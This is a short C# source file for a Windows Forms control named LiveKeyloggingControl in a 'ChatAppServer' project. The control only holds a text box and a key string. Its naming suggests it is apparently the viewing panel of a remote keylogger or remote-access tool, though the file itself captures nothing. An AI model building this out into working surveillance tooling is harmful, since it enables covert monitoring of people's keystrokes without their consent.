using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using  DevExpress.XtraEditors;

namespace ChatAppServer
{
    
    public partial class LiveKeyloggingControl : UserControl
    {
        MemoEdit memoEdit;
        private string key;
        public LiveKeyloggingControl()
        {
            InitializeComponent();
            memoEdit = memoEdit2;
        }

        public string Key
        {
            get { return key; }
            set { key = value; }
        }

        public MemoEdit MemoEdit
        {
            get { return memoEdit; }
            set { memoEdit = value; }
        }
    }
}
